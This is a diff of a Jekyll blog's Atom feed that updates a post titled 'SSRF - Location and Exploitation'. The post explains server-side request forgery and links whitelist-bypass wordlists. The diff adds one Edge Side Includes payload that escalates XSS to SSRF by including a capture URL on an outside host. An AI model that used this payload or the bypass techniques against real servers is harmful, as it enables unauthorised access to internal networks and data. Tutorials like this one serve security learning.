@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-08T21:05:45+01:00</updated><id>http://localhost:4000/</id><title type="html">Hacker Street</title><subtitle></subtitle><entry><title type="html">SSRF - Location and Exploitation</title><link href="http://localhost:4000/SSRF" rel="alternate" type="text/html" title="SSRF - Location and Exploitation" /><published>2020-08-06T00:00:00+01:00</published><updated>2020-08-06T00:00:00+01:00</updated><id>http://localhost:4000/SSRF</id><content type="html" xml:base="http://localhost:4000/SSRF">&lt;p&gt;Server Side Request Forgery (SSRF) is an exploit that allows an attacker to make arbitrary HTTP requests from the web server. These could be to access an internal network or to reach out to a malicious site, essentially turning the web server into a proxy server.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-29T09:52:08+01:00</updated><id>http://localhost:4000/</id><title type="html">Hacker Street</title><subtitle></subtitle><entry><title type="html">SSRF - Location and Exploitation</title><link href="http://localhost:4000/SSRF" rel="alternate" type="text/html" title="SSRF - Location and Exploitation" /><published>2020-08-06T00:00:00+01:00</published><updated>2020-08-06T00:00:00+01:00</updated><id>http://localhost:4000/SSRF</id><content type="html" xml:base="http://localhost:4000/SSRF">&lt;p&gt;Server Side Request Forgery (SSRF) is an exploit that allows an attacker to make arbitrary HTTP requests from the web server. These could be to access an internal network or to reach out to a malicious site, essentially turning the web server into a proxy server.&lt;/p&gt;
 
 &lt;h2&gt;How to find SSRF&lt;/h2&gt;
 
@@ -45,6 +45,12 @@
 &lt;h3&gt;Whitelisting Bypass&lt;/h3&gt;
 
 &lt;p&gt;A white list on the other hand will only allow submissions that contain certain strings. The key here is to include the expected domain as well as malicious one. Again on my &lt;a href=&quot;https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt&quot;&gt;Github&lt;/a&gt; I have a wordlist to attempt to circumvent these. It is set up for the local host but can be adapted for any. Some will only work if you are pointing it to a site you control.&lt;/p&gt;
+
+&lt;h3&gt;SSRF from XSS&lt;/h3&gt;
+
+&lt;p&gt;@georgeomnet posted an example of how to escalate an XSS to SSRF:&lt;/p&gt;
+
+&lt;p&gt;&amp;lt; esi:include src=”http ://site.com/capture” /&amp;gt;&lt;/p&gt;
 
 &lt;h2&gt;Disclaimer&lt;/h2&gt;
 
